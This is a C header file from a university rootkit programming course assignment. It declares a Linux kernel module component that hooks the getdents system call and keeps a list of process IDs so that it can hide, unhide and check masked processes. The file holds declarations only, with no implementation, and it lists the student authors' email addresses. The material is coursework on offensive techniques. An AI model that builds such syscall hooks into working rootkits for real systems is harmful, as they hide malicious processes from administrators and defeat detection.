
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 3                                                             */
/*                                                                             */
/*   Filename: process_masker.h                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#ifndef __PROCESS_MASKING__
#define __PROCESS_MASKING__


#define PIDS_BUFFSIZE 128

unsigned long proc_ino;
struct process {
	struct list_head list;
	pid_t pid;
};

struct linux_dirent {
	long d_ino;
	off_t d_off;
	unsigned short d_reclen;
	char d_name[];
};

static struct list_head processes;

asmlinkage int (*original_getdents_syscall)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
unsigned long get_inode_no(char *path_name);
int should_mask(pid_t pid);
int process_is_hidden(int pid);
void mask_process(int pid);
void unmask_process(int pid);

#endif
